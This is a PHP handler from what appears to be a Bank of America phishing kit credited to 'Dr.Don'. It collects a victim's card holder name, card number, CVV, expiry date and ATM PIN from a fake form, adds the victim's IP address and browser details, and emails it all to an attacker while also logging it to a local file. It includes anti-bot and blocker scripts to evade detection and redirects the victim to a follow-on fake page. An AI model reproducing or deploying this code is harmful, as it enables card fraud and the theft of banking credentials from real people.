<?php
$zabi = getenv("REMOTE_ADDR");
include './antibots.php';
include('../email.php');
include './bt.php';
include "./blocker.php";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  BOA C4RD  -------------\n";
$message .= "Name on Card : ".$_POST['nameon']."\n";
$message .= "Card Number : ".$_POST['cc']."\n";
$message .= "Security code      : ".$_POST['CVV']."\n";
$message .= "expire Month: ".$_POST['bmonth']."\n";
$message .= "expire Year: ".$_POST['byear']."\n";
$message .= "ATM/PIN      : ".$_POST['PIN']."\n";
$message .= "++-----[ $$ Fully Undetected by Dr.Don $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Dr.Don  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "BOA Card [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $subject);
mail(','.$form,$subject,$message,$headers);

header("Location: fin.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>